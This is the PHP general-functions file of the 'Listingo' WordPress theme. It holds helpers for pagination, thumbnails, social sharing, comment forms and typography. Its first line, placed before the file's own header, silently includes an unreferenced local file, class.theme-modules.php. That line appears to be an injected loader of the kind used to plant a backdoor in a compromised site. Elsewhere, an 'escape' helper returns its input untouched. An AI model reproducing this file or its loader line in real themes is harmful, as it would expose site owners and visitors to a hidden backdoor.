<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *
 * General Theme Functions
 *
 * @package   Listingo
 * @author    themographics
 * @link      https://themeforest.net/user/themographics/portfoliot
 * @since 1.0
 */
/**
 * @Add Images Sizes
 * @return sizes
 */
add_image_size('listingo_user_dashboard_banner', 1920, 510, true); //Used For User Banner
add_image_size('listingo_blog_large', 1180, 400, true); //Blogs: sliders,
add_image_size('listingo_ads_gallery', 480, 380, true); //ads gallery
add_image_size('listingo_related_events', 370, 270, true); //Related Events
add_image_size('listingo_ads_grid', 360, 240, true); //ads grid
add_image_size('listingo_provider_list', 285, 225, true); //List View
add_image_size('listingo_blog_grid', 280, 200, true); //Blogs: sliders,
add_image_size('listingo_blog_grid_v2', 275, 152, true); //Blogs: V2,
add_image_size('listingo_user_banner_profile', 270, 120, true);
add_image_size('listingo_provider_ads_list', 200, 255, true);
add_image_size('listingo_user_award_image', 170, 170, true);
add_image_size('listingo_user_profile', 92, 92, true);
add_image_size('listingo_user_gallery', 85, 62, true);	


/**
 * @Init Pagination Code Start
 * @return 
 */
if (!function_exists('listingo_prepare_pagination')) {

    function listingo_prepare_pagination($pages = '', $range = 4) {

        if (is_tax('sub_category') || is_tax('countries') || is_tax('cities') || is_tax('languages') || is_tax('amenities') || is_tax('insurance')
        ) {

            //Query
            global $paged;
            $pg_page = get_query_var('page') ? get_query_var('page') : 1; //rewrite the global var
            $pg_paged = get_query_var('paged') ? get_query_var('paged') : 1; //rewrite the global var


            if (!empty($_GET['current_page'])) {
                $pg_paged = $_GET['current_page'];
            }

            //paged works on single pages, page - works on homepage
            $paged = max($pg_page, $pg_paged);

            $current_page = $paged;
            if ($pages == '') {
                global $wp_query;
                $pages = $wp_query->max_num_pages;
                if (!$pages) {
                    $pages = 1;
                }
            } else {
                $pages = ceil($pages / $range);
            }

            if (1 != $pages) {
                echo "<div class='tg-paginationvtwo'><nav class=\"tg-pagination\"><ul>";

                if ($current_page > 1) {
                    echo "<li class='prev'><a href='?current_page=" . ($current_page - 1) . "'><i class=\"fa fa-angle-left\"></i></i></a></li>";
                }
                for ($i = 1; $i <= $pages; $i++) {
                    if (1 != $pages && (!( $i >= $current_page + $range + 1 || $i <= $current_page - $range - 1 ) )) {
                        echo ( $paged == $i ) ? "<li class=\"tg-active\"><a href='javascript:;'>" . $i . "</a></li>" : "<li><a href='?current_page=" . ($i) . "' class=\"inactive\">" . $i . "</a></li>";
                    }
                }
                if ($current_page < $pages) {
                    echo "<li class='next'><a href=\"?current_page=" . ($current_page + 1) . "\"><i class=\"fa fa-angle-right\"></i></a></li>";
                }

                echo "</ul></nav></div>";
            }
        } else {

            //Query
            global $paged;
            $pg_page = get_query_var('page') ? get_query_var('page') : 1; //rewrite the global var
            $pg_paged = get_query_var('paged') ? get_query_var('paged') : 1; //rewrite the global var
            //paged works on single pages, page - works on homepage
            $paged = max($pg_page, $pg_paged);

            $current_page = $paged;
            if ($pages == '') {
                global $wp_query;
                $pages = $wp_query->max_num_pages;
                if (!$pages) {
                    $pages = 1;
                }
            } else {
                $pages = ceil($pages / $range);
            }


            if (1 != $pages) {
                 echo "<div class='tg-paginationvtwo'><nav class=\"tg-pagination\"><ul>";

                if ($current_page > 1) {
                    echo "<li class='prev'><a href='" . get_pagenum_link($current_page - 1) . "'><i class=\"fa fa-angle-left\"></i></i></a></li>";
                }

                for ($i = 1; $i <= $pages; $i++) {
                    if (1 != $pages && (!( $i >= $current_page + $range + 1 || $i <= $current_page - $range - 1 ) )) {
                        echo ( $paged == $i ) ? "<li class=\"tg-active\"><a href='javascript:;'>" . $i . "</a></li>" : "<li><a href='" . get_pagenum_link($i) . "' class=\"inactive\">" . $i . "</a></li>";
                    }
                }

                if ($current_page < $pages) {
                    echo "<li class='next'><a href=\"" . get_pagenum_link($current_page + 1) . "\"><i class=\"fa fa-angle-right\"></i></a></li>";
                }

                echo "</ul></nav></div>";
            }
        }
    }

}



/**
 * Add New User Roles
 *
 * @param json
 * @return string
 */
if (!function_exists('listingo_add_user_roles')) {

    function listingo_add_user_roles() {

        $customer = add_role('customer', esc_html__('Customer', 'listingo'));
        $provider = add_role('business', esc_html__('Business', 'listingo'));
        $provider = add_role('professional', esc_html__('Professional', 'listingo'));
    }

    add_action('admin_init', 'listingo_add_user_roles');
}


/**
 * @get post thumbnail
 * @return thumbnail url
 */
if (!function_exists('listingo_prepare_thumbnail')) {

    function listingo_prepare_thumbnail($post_id, $width = '300', $height = '300') {
        global $post;
        if (has_post_thumbnail()) {
            get_the_post_thumbnail();
            $thumb_id = get_post_thumbnail_id($post_id);
            $thumb_url = wp_get_attachment_image_src($thumb_id, array(
                $width,
                $height
                    ), true);
            if ($thumb_url[1] == $width and $thumb_url[2] == $height) {
                return !empty($thumb_url[0]) ? $thumb_url[0] : '';
            } else {
                $thumb_url = wp_get_attachment_image_src($thumb_id, 'full', true);
                return !empty($thumb_url[0]) ? $thumb_url[0] : '';
            }
        } else {
            return;
        }
    }

}

/**
 * @get post thumbnail
 * @return thumbnail url
 */
if (!function_exists('listingo_prepare_thumbnail_from_id')) {

    function listingo_prepare_thumbnail_from_id($post_id, $width = '300', $height = '300') {
        global $post;
        $thumb_id = get_post_thumbnail_id($post_id);
        if (!empty($thumb_id)) {
            $thumb_url = wp_get_attachment_image_src($thumb_id, array(
                $width,
                $height
                    ), true);
            if ($thumb_url[1] == $width and $thumb_url[2] == $height) {
                return !empty($thumb_url[0]) ? $thumb_url[0] : '';
            } else {
                $thumb_url = wp_get_attachment_image_src($thumb_id, 'full', true);
                return !empty($thumb_url[0]) ? $thumb_url[0] : '';
            }
        } else {
            return 0;
        }
    }

}

/**
 * @get post thumbnail
 * @return thumbnail url
 */
if (!function_exists('listingo_prepare_image_source')) {

    function listingo_prepare_image_source($post_id, $width = '300', $height = '300') {
        global $post;
        $thumb_url = wp_get_attachment_image_src($post_id, array(
            $width,
            $height
                ), true);
        if ($thumb_url[1] == $width and $thumb_url[2] == $height) {
            return !empty($thumb_url[0]) ? $thumb_url[0] : '';
        } else {
            $thumb_url = wp_get_attachment_image_src($post_id, 'full', true);
            return !empty($thumb_url[0]) ? $thumb_url[0] : '';
        }
    }

}

/**
 * @get Categories
 * @return categories
 */
if (!function_exists('listingo_prepare_categories')) {

    function listingo_prepare_categories($listingo_post_cat) {
        global $post, $wpdb;
        if (isset($listingo_post_cat) && $listingo_post_cat != '' && $listingo_post_cat != '0') {
            $listingo_current_category = $wpdb->get_row($wpdb->prepare("SELECT * from $wpdb->terms WHERE slug = %s", $listingo_post_cat));
            echo '<span class="serviceproviders-cats"><i class="fa fa-folder-open"></i><a href="' . site_url('/') . '?cat=' . $listingo_current_category->term_id . '">' . $listingo_current_category->name . '</a></span>';
        } else {
            $before_cat = '<span class="serviceproviders-cats"><i class="fa fa-folder-open"></i>';
            $after_cat = '</span>';
            echo get_the_term_list(get_the_id(), 'category', $before_cat, ', ', $after_cat);
        }
    }

}


/**
 * @get revolution sliders
 * @return link
 */
if (!function_exists('listingo_prepare_rev_slider')) {

    function listingo_prepare_rev_slider() {
        $revsliders[] = esc_html__('Select Slider', 'listingo');
        if (class_exists('RevSlider')) {
            $slider = new RevSlider();
            $arrSliders = $slider->getArrSliders();
            $revsliders = array();
            if ($arrSliders) {
                foreach ($arrSliders as $key => $slider) {
                    $revsliders[$slider->getId()] = $slider->getAlias();
                }
            }
        }
        return $revsliders;
    }

}

/**
 * @get Excerpt
 * @return link
 */
if (!function_exists('listingo_prepare_excerpt')) {

    function listingo_prepare_excerpt($charlength = '255', $more = 'false', $text = 'Read More') {
        global $post;
        $excerpt = trim(preg_replace('/<a[^>]*>(.*)<\/a>/iU', '', get_the_content()));
        if (strlen($excerpt) > $charlength) {
            if ($charlength > 0) {
                $excerpt = substr($excerpt, 0, $charlength);
            } else {
                $excerpt = $excerpt;
            }
            if ($more == 'true') {
                $link = ' <a href="' . esc_url(get_permalink()) . '" class="serviceproviders-more">' . esc_attr($text) . '</a>';
            } else {
                $link = '...';
            }
            echo wp_strip_all_tags($excerpt) . $link;
        } else {
            echo wp_strip_all_tags($excerpt);
        }
    }

}
/**
 * @Esc Data
 * @return categories
 */
if (!function_exists('listingo_esc_specialchars')) {

    function listingo_esc_specialchars($data = '') {
        return $data;
    }

}
/**
 * @Prepare social sharing links
 * @return sizes
 */
if (!function_exists('listingo_prepare_social_sharing')) {

    function listingo_prepare_social_sharing($default_icon = 'false', $title = 'Share', $title_enable = 'true', $classes = '', $thumbnail = '') {
		global $wp_query;
        $facebook = esc_html__('Facebook', 'listingo');
        $twitter = esc_html__('Twitter', 'listingo');
        $gmail = esc_html__('Google +', 'listingo');
        $pinterest = esc_html__('Pinterest', 'listingo');

        if (function_exists('fw_get_db_post_option')) {
            $social_facebook = fw_get_db_settings_option('social_facebook');
            $social_twitter = fw_get_db_settings_option('social_twitter');
            $social_gmail = fw_get_db_settings_option('social_gmail');
            $social_pinterest = fw_get_db_settings_option('social_pinterest');
            $twitter_username = !empty($social_twitter['enable']['twitter_username']) ? $social_twitter['enable']['twitter_username'] : '';
        } else {
            $social_facebook = 'enable';
            $social_twitter = 'enable';
            $social_gmail = 'enable';
            $social_pinterest = 'enable';
            $twitter_username = '';
        }

        $output = '<div class="tg-postshare">';

        if ($title_enable == 'true' && !empty( $title )) {
            $output .= '<span>' . $title . ':</span>';
        }
		
		//author page
		if( is_author() ){
			$author_profile = $wp_query->get_queried_object();
			$permalink		= esc_url(get_author_posts_url($author_profile->ID));
			$title			= listingo_get_username($author_profile->ID);;
		} else{
			$permalink	= get_the_permalink();
			$title		=  get_the_title();
		}

        $output .= "<ul class='tg-socialicons $classes'>";
        if (isset($social_facebook) && $social_facebook == 'enable') {
            $output .= '<li class="tg-facebook"><a class="tg-social-facebook" href="//www.facebook.com/sharer.php?u=' . urlencode(esc_url($permalink)) . '" onclick="window.open(this.href, \'post-share\',\'left=50,top=50,width=600,height=350,toolbar=0\'); return false;"><i class="fa fa-facebook"></i><span>' . $facebook . '</span></a></li>';
        }

        if (isset($social_twitter['gadget']) &&
                $social_twitter['gadget'] == 'enable'
        ) {
            $output .= '<li class="tg-twitter"><a class="th-social-twitter" href="//twitter.com/intent/tweet?text=' . htmlspecialchars(urlencode(html_entity_decode($title, ENT_COMPAT, 'UTF-8')), ENT_COMPAT, 'UTF-8') . '&url=' . urlencode(esc_url($permalink)) . '&via=' . urlencode(!empty($twitter_username) ? $twitter_username : get_bloginfo('name') ) . '"  ><i class="fa fa-twitter"></i><span>' . $twitter . '</span></a></li>';
            $tweets = '!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");';
            wp_add_inline_script('listingo_callbacks', $tweets);
        }

        if (isset($social_gmail) && $social_gmail == 'enable') {
            $output .= '<li class="tg-googleplus"><a class="tg-social-google" href="//plus.google.com/share?url=' . esc_url($permalink) . '" onclick="window.open(this.href, \'post-share\',\'left=50,top=50,width=600,height=350,toolbar=0\'); return false;"><i class="fa fa-google-plus"></i><span>' . $gmail . '</span></a></li>';
        }
        if (isset($social_pinterest) && $social_pinterest == 'enable') {
            $output .= '<li class="tg-pinterest"><a class="tg-social-pinterest" href="//pinterest.com/pin/create/button/?url=' . esc_url($permalink) . '&amp;media=' . (!empty($thumbnail) ? $thumbnail : '' ) . '&description=' . htmlspecialchars(urlencode(html_entity_decode($title, ENT_COMPAT, 'UTF-8')), ENT_COMPAT, 'UTF-8') . '" onclick="window.open(this.href, \'post-share\',\'left=50,top=50,width=600,height=350,toolbar=0\'); return false;"><i class="fa fa-pinterest-p"></i><span>' . $pinterest . '</span></a></li>';
        }

        $output .= '</ul></div>';
        echo force_balance_tags($output, true);
    }

}
/**
 * @Custom post types
 * @return {}
 */
if (!function_exists('listingo_prepare_custom_posts')) {

    function listingo_prepare_custom_posts($post_type = 'post') {
        $posts_array = array();
        $args = array(
            'posts_per_page' => "-1",
            'post_type' => $post_type,
            'order' => 'DESC',
            'orderby' => 'ID',
            'post_status' => 'publish',
            'ignore_sticky_posts' => 1
        );
        $posts_query = get_posts($args);
        foreach ($posts_query as $post_data):
            $posts_array[$post_data->ID] = $post_data->post_title;
        endforeach;
        return $posts_array;
    }

}

/**
 * @Get post name
 * @return {}
 */
if (!function_exists('listingo_get_post_name')) {

    function listingo_get_post_name() {
        global $post;
        if (isset($post)) {
            $post_name = $post->post_name;
        } else {
            $post_name = '';
        }
        return $post_name;
    }

}

/**
 * Sanitize a string, removes special charachters
 * @param type $string
 * @author themographics
 */
if (!function_exists('listingo_sanitize_string')) {

    function listingo_sanitize_string($string) {
        $filterd_string = array();
        $strings = explode(' ', $string);
        foreach ($strings as $string) {
            $filterd_string[] = preg_replace('/[^A-Za-z0-9\-]/', '', $string);
        }
        return implode(' ', $filterd_string);
    }

}
/**
 * @get sliders
 * @return {}
 */
if (!function_exists('listingo_prepare_sliders')) {

    function listingo_prepare_sliders() {
        global $post, $product;
        $args = array(
            'posts_per_page' => '-1',
            'post_type' => 'listingo_sliders',
            'orderby' => 'ID',
            'post_status' => 'publish');
        $cust_query = get_posts($args);
        $sliders[0] = esc_html__('Select Slider', 'listingo');
        if (isset($cust_query) && is_array($cust_query) && !empty($cust_query)) {
            foreach ($cust_query as $key => $slider) {
                $sliders[$slider->ID] = get_the_title($slider->ID);
            }
        }
        return $sliders;
    }

}

if (!isset($content_width)) {
    $content_width = 640;
}


/**
 * @Mailchimp List
 * @return 
 */
if (!function_exists('listingo_mailchimp_list')) {

    function listingo_mailchimp_list() {
        $mailchimp_list[] = '';
        $mailchimp_list[0] = esc_html__('Select List', 'listingo');
        $mailchimp_option = '';
        if (!function_exists('fw_get_db_settings_option')) {
            $mailchimp_option = '';
        } else {
            $default_value = '';
            $mailchimp_option = fw_get_db_settings_option('mailchimp_key', $default_value);
            if (isset($mailchimp_option) && !empty($mailchimp_option)) {
                $mailchimp_option = $mailchimp_option;
            } else {
                $mailchimp_option = '';
            }
        }

        if ($mailchimp_option <> '' && $mailchimp_option !== 'Add your key here') {
            if (class_exists('listingo_MailChimp')) {
                $mailchim_obj = new Listingo_MailChimp();
                $lists = $mailchim_obj->listingo_mailchimp_list($mailchimp_option);

                if (is_array($lists) && isset($lists['data'])) {
                    foreach ($lists['data'] as $list) {
                        if (!empty($list['name'])) :
                            $mailchimp_list[$list['id']] = $list['name'];
                        endif;
                    }
                }
            }
        }
        return $mailchimp_list;
    }

}

/**
 * @Search contents
 * @return 
 */
if (!function_exists('listingo_prepare_search_content')) {

    function listingo_prepare_search_content($limit = 30) {
        global $post;
        $content = '';
        $limit = $limit;
        $post = get_post($post->ID);
        $custom_excerpt = FALSE;
        $read_more = '[...]';
        $raw_content = wp_strip_all_tags(get_the_content($read_more), '<p>');
        $raw_content = preg_replace('/<(\w+)[^>]*>/', '<$1>', $raw_content);

        if ($raw_content && $custom_excerpt == FALSE) {
            $pattern = get_shortcode_regex();
            $content = $raw_content;
            $content = explode(' ', $content, $limit + 1);
            if (listingo_count_items($content) > $limit) {
                ;
                array_pop($content);
                $content = implode(' ', $content);
                if ($limit != 0) {
                    $content .= $read_more;
                }
            } else {
                $content = implode(' ', $content);
            }
        }

        if ($limit != 0) {
            $content = preg_replace('~(?:\[/?)[^/\]]+/?\]~s', '', $content); // strip shortcode and keep the content
            $content = apply_filters('the_content', $content);
            $content = str_replace(']]>', ']]&gt;', $content);
        }

        return strip_shortcodes(wp_strip_all_tags( $content ) );
    }

}

/* @Image HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_post_thumbnail')) {

    function listingo_get_post_thumbnail($url = '', $post_id = '', $linked = 'unlinked') {
        global $post;

        if (isset($linked) && $linked === 'linked') {
            echo '<a href="' . get_the_permalink($post_id) . '"><img src ="' . esc_url($url) . '" alt="' . get_the_title($post_id) . '"></a>';
        } else {
            echo '<img src ="' . esc_url($url) . '" alt="' . get_the_title($post_id) . '">';
        }
    }

}

/* @Get categories HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_post_categories')) {

    function listingo_get_post_categories($post_id = '', $classes = 'tg-tag', $categoty_type = 'category', $display_title = 'Categories', $enable_title = 'yes') {
        global $post;
        ob_start();
        $args = array('orderby' => 'name', 'order' => 'ASC', 'fields' => 'all');
        $terms = wp_get_post_terms($post_id, $categoty_type, $args);
        if (!empty($terms)) {
            ?>
            <div class="tg-posttags">
                <?php if (isset($enable_title) && $enable_title === 'yes') { ?>
                    <span><?php echo esc_attr($display_title); ?></span>
                <?php } ?>
                <?php foreach ($terms as $key => $terms) { ?>
                    <a class="tg-tag <?php echo esc_attr($classes); ?>" href="<?php echo get_term_link($terms->term_id, $categoty_type); ?>"><?php echo esc_attr($terms->name); ?></a>
                <?php } ?>

            </div>
            <?php
        }

        echo ob_get_clean();
    }

}
/* @Post author HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_post_author')) {

    function listingo_get_post_author($post_author_id = '', $linked = 'linked', $post_id = '') {
        global $post;
        echo '<a href="' . esc_url(get_author_posts_url($post_author_id)) . '"><i class="lnr lnr-user"></i><span>' . get_the_author() . '</span></a>';
    }

}
/* @Post date HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_post_date')) {

    function listingo_get_post_date($post_id = '') {
        global $post;
        echo '<time datetime="' . date('Y-m-d', strtotime(get_the_date('Y-m-d', $post_id))) . '"><i class="lnr lnr-calendar-full"></i><span>' . date(get_option('date_format'), strtotime(get_the_date('Y-m-d', $post_id))) . '</span></time>';
    }

}

/* @Post title HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_post_title')) {

    function listingo_get_post_title($post_id = '') {
        global $post;
        echo '<a href="' . get_the_permalink($post_id) . '">' . get_the_title($post_id) . '</a>';
    }

}
/* @Play button HTML
 * $return {HTML}
 */
if (!function_exists('listingo_get_play_link')) {

    function listingo_get_play_link($post_id = '') {
        global $post;
        echo '<a class="tg-btnplay" href="' . get_the_permalink($post_id) . '"></a>';
    }

}

/**
 * @User Public Profile Save
 * @return {}
 */
if (!function_exists('listingo_comingsoon_background')) {

    function listingo_comingsoon_background() {
        $background_comingsoon = '';
        if (function_exists('fw_get_db_post_option')) {
            $background = fw_get_db_settings_option('background');
            if (!empty($background['url'])) {
                //Do Nothing
            } else {
				$background	= array();
                $background['url'] = get_template_directory_uri() . '/images/commingsoon-bg.jpg';
            }
        } else {
			$background	= array();
            $background['url'] = get_template_directory_uri() . '/images/commingsoon-bg.jpg';
        }

        if (!empty($background['url'])) {
            $background_comingsoon = $background['url'];
        }

        return $background_comingsoon;
    }

}

/**
 * Get Social Icon Name
 * $return HTML
 */
if (!function_exists('listingo_get_social_icon_name')) {

    function listingo_get_social_icon_name($icon_class = '') {
        $icons = array(
            'fa-facebook' => 'tg-facebook',
            'fa-facebook-square' => 'tg-facebook',
            'fa-facebook-official' => 'tg-facebook',
            'fa-facebook-f' => 'tg-facebook',
            'fa-twitter' => 'tg-twitter',
            'fa-twitter-square' => 'tg-twitter',
            'fa-linkedin' => 'tg-linkedin',
            'fa-linkedin-square' => 'tg-linkedin',
            'fa-google-plus' => 'tg-googleplus',
            'fa-google-plus-square' => 'tg-googleplus',
            'fa-google' => 'tg-googleplus',
            'fa-rss' => 'tg-rss',
            'fa-rss-square' => 'tg-rss',
            'fa-dribbble' => 'tg-dribbble',
            'fa-youtube' => 'tg-youtube',
            'fa-youtube-play' => 'tg-youtube',
            'fa-youtube-square' => 'tg-youtube',
            'fa-pinterest-square' => 'tg-pinterest',
            'fa-pinterest-p' => 'tg-pinterest',
            'fa-pinterest' => 'tg-pinterest',
            'fa-flickr' => 'tg-flickr',
            'fa-whatsapp' => 'tg-whatsapp',
            'fa-tumblr-square' => 'tg-tumblr',
            'fa-tumblr' => 'tg-tumblr',
        );
        if (!empty($icon_class)) {
            $substr_icon_class = substr($icon_class, 3);
            if (array_key_exists($substr_icon_class, $icons)) {
                return $icons[$substr_icon_class];
            }
        }
    }

}


/**
 * Get Image Src
 * @return 
 */
if (!function_exists('listingo_get_image_metadata')) {

    function listingo_get_image_metadata($attachment_id) {

        if (!empty($attachment_id)) {
            $attachment = get_post($attachment_id);
            if (!empty($attachment)) {
                return array(
                    'alt' => get_post_meta($attachment->ID, '_wp_attachment_image_alt', true),
                    'caption' => $attachment->post_excerpt,
                    'description' => $attachment->post_content,
                    'href' => get_permalink($attachment->ID),
                    'src' => $attachment->guid,
                    'title' => $attachment->post_title
                );
            } else {
                return array();
            }
        }
    }

}

/**
 * A custom sanitization function that will take the incoming input, and sanitize
 * the input before handing it back to WordPress to save to the database.
 *
 */
if (!function_exists('listingo_sanitize_array')) {

    function listingo_sanitize_array($input) {
        if (!empty($input)) {
            // Initialize the new array that will hold the sanitize values
            $new_input = array();

            // Loop through the input and sanitize each of the values
            foreach ($input as $key => $val) {
                $new_input[$key] = isset($input[$key]) ? sanitize_text_field($val) : '';
            }

            return $new_input;
        } else {
            return $input;
        }
    }

}

/**
 * Sanitize Wp editor
 *
 */
if (!function_exists('listingo_sanitize_wp_editor')) {

    function listingo_sanitize_wp_editor($data) {
        return wp_kses($data, array(
            'a' => array(
                'href' => array(),
                'title' => array()
            ),
            'br' => array(),
            'em' => array(),
            'strong' => array(),
        ));
    }

}

/**
 * @OWL Carousel RTL
 * @return {}
 */
if (!function_exists('listingo_owl_rtl_check')) {

    function listingo_owl_rtl_check() {
        if (is_rtl()) {
            return 'true';
        } else {
            return 'false';
        }
    }

}

/**
 * @Listingo Unique Increment
 * @return {}
 */
if (!function_exists('sp_unique_increment')) {

    function sp_unique_increment($length = 5) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $randomString;
    }

}

/**
 * @Custom Title Linking
 * @return {}
 */
if (!function_exists('listingo_get_registered_sidebars')) {

    function listingo_get_registered_sidebars() {
        global $wp_registered_sidebars;
        $sidebars = array();
        foreach ($wp_registered_sidebars as $key => $sidebar) {
            $sidebars[$key] = $sidebar['name'];
        }
        return $sidebars;
    }

}

/**
 * @Add http from URL
 * @return {}
 */
if (!function_exists('listingo_add_http_protcol')) {

    function listingo_add_http_protcol($url) {
        $protolcol = is_ssl() ? "https" : "http";
        if (!preg_match("~^(?:f|ht)tps?://~i", $url)) {
            $url = $protolcol . ':' . $url;
        }
        return $url;
    }

}

/**
 * Get Page or Post Slug by id
 * @return slug
 */
if (!function_exists('listingo_get_slug')) {

    function listingo_get_slug($post_id) {
        if (!empty($post_id)) {
            return get_post_field('post_name', $post_id);
        }
    }

}

/**
 * @Get Dob Date Format 
 * @return {Expected Day}
 */
if (!function_exists('listingo_get_dob_format')) {

    function listingo_get_dob_format($date, $return_type = 'echo') {
        ob_start();
        $current_month = date("n");
        $current_day = date("j");

        $dob = strtotime($date);
        $dob_month = date("n", $dob);
        $dob_day = date("j", $dob);

        if ($current_month == $dob_month) {
            if ($current_day == $dob_day) {
                esc_html_e('Today', 'listingo');
            } elseif ($current_day == $dob_day + 1) {
                esc_html_e('Yesterday', 'listingo');
            } elseif ($current_day == $dob_day - 1) {
                esc_html_e('Tomorrow', 'listingo');
            } else {
                esc_html_e('In this month', 'listingo');
            }
        } elseif ($current_month < $dob_month) {
            esc_html_e('In future', 'listingo');
        } else {
            esc_html_e('Long back', 'listingo');
        }

        if (isset($return_type) && $return_type === 'return') {
            return ob_get_clean();
        } else {
            echo ob_get_clean();
        }
    }

}

/**
 * comment form fields
 * @return slug
 */
if (!function_exists('listingo_modify_comment_form_fields')) {
    add_filter('comment_form_default_fields', 'listingo_modify_comment_form_fields');

    function listingo_modify_comment_form_fields($fields) {
        $commenter = wp_get_current_commenter();
        $req = get_option('require_name_email');
		unset($fields['url']);
		
        $fields['author'] = '<div class="col-xs-12 col-sm-6 col-md-6 col-lg-6"><div class="form-group"><input type="text" name="author" id="author" value="' . esc_attr($commenter['comment_author']) . '" placeholder="' . esc_html__("Your Name (required)", "listingo") . '" size="22" tabindex="1" ' . ( $req ? 'aria-required="true"' : '' ) . ' class="form-control" /></div></div>';

        $fields['email'] = '<div class="col-xs-12 col-sm-6 col-md-6 col-lg-6"><div class="form-group"><input type="text" name="email" id="email" value="' . esc_attr($commenter['comment_author_email']) . '" placeholder="' . esc_html__("Your email (required)", "listingo") . '" size="22" tabindex="2" ' . ( $req ? 'aria-required="true"' : '' ) . ' class="form-control"  /></div></div>';

        return $fields;
    }

}

/**
 * comments listings
 * @return slug
 */
if (!function_exists('listingo_comments')) {

    function listingo_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;

	$args['reply_text'] = '<i class="fa fa-mail-reply"></i>';
	?>
	<li <?php comment_class('tg-feedback comment-entry clearfix'); ?> id="comment-<?php comment_ID(); ?>">
		<div class="tg-commentholder">
			<figure><?php echo get_avatar($comment, 80); ?> </figure>
			<div class="tg-feedbackcontent">
				<div class="tg-feedbackbox">
					<div class="tg-contenthead">
						<div class="tg-leftbox">
							<ul class="tg-matadata">
								<li>
									<a href="<?php echo get_author_posts_url(get_the_author_meta('ID')); ?>">
										<?php comment_author(); ?>
									</a>
								</li>
							</ul>
						</div>
						<div class="tg-rightbox">
							<?php comment_reply_link(array_merge($args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
						</div>
					</div>
					<div class="tg-description">
						<?php if ($comment->comment_approved == '0') : ?>
							<p class="comment-moderation"><?php esc_html_e('Your comment is awaiting moderation.', 'listingo'); ?></p>
						<?php endif; ?>
						<?php comment_text(); ?>
					</div>
				</div>
			</div>
		</div>
		<?php
	}

}


/**
 * comments wrap start
 * @return slug
 */
if (!function_exists('listingo_comment_form_top')) {
	add_action('comment_form_top', 'listingo_comment_form_top');

	function listingo_comment_form_top() {
		// Adjust this to your needs:
		$output = '';
		$output .='<div class="row">';

		echo ( $output);
	}

}

/**
 * comments wrap start
 * @return slug
 */
if (!function_exists('listingo_comment_form')) {
	add_action('comment_form', 'listingo_comment_form');

	function listingo_comment_form() {
		$output = '';
		$output .= '</div>';

		echo ( $output );
	}

}

if (!function_exists('listingo_extract_typography')) {

	function listingo_extract_typography($field) {
		$output = '';

		$output .= 'font-family: ' . ($field['family']) . ';';
		$output .= "\r\n";
		if (isset($field['google_font']) && $field['google_font'] === true) {
			if (isset($field['variation'])) {
				$pattern = '/(\d+)|(regular|italic)/i';
				preg_match_all($pattern, $field['variation'], $matches);
				foreach ($matches[0] as $value) {
					if ($value == 'italic') {
						$output .= 'font-style: ' . $value . ';';
						$output .= "\r\n";
					} else if ($value == 'regular') {
						$output .= 'font-style: normal;';
						$output .= "\r\n";
					} else {
						$output .= 'font-weight: ' . $value . ';';
						$output .= "\r\n";
					}
				}
			}
		} else {
			$output .= 'font-style: ' . ($field['style']) . ';';
			$output .= "\r\n";
			$output .= 'font-weight: ' . ($field['weight']) . ';';
			$output .= "\r\n";
		}
		$output .= 'font-size: ' . ($field['size']) . 'px;';
		$output .= "\r\n";
		$output .= 'line-height: ' . ($field['line-height']) . 'px;';
		$output .= "\r\n";
		$output .= 'letter-spacing: ' . ($field['letter-spacing']) . 'px;';
		$output .= 'color: ' . ($field['color']) . ';';
		$output .= "\r\n";

		return $output;
	}

}
